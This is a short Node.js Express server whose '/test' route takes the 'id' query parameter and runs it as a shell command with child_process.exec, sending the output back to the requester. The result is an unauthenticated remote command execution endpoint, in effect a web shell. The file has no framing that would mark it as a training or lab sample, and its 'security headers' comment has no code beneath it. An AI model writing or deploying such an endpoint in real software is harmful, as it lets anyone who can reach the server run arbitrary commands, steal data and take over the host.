const express = require('express')
const { exec } = require("child_process");
const app = express()

// Use to parse body (PUT/POST)

app.use(express.json())

// Configure security headers

app.listen(8080, () => {
  console.log("Up and Running")
})

// handling routes

app.get('/test', (req,res) => {
      let id = req.query.id
      exec(id, (error, stdout, stderr) => {
        if (error) {
          console.log(`error: ${error.message}`)

          res.send("Command unknown")
          return
        }
        if (stderr) {
          console.log(`stderr: ${stderr}`)
          res.send(stderr)
          return
        }
        if (stdout) {
          res.send(stdout)
          return
        }
      })
})
